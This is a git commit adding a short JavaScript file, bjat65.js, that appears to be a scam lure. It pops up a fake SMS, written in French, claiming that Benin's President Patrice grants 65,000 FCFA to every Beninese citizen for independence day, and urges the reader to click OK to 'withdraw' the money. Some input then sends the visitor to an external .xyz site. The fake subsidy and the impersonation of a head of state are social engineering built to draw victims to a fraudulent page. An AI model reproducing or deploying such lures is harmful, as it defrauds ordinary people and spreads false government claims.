5d0d79a2ee3ca98ed88c577faf5def988b361b8a
bigetijazz32 <bigetijazz32@gmail.com>
2025-07-31 13:59:10 +0100

    Create bjat65.js

---
+++ bjat65.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIRER 65,000FCFA'
+password=prompt('SMS: bonjour mon cher, Le Président Patrice accorde une subvention de 65,000 FCFA à tous les Béninois à l'occasion de la fête de l'indépendance. to RETIRER 65,000FCFA, appuyez sur OK pour vérifier maintenant','RETIRER 65,000FCFA');
+if (password != 'RETIRER 65,000FCFA') {
+location.href='https://www.udwang.xyz/retirer-BJ-65000-independence-grant';
+}
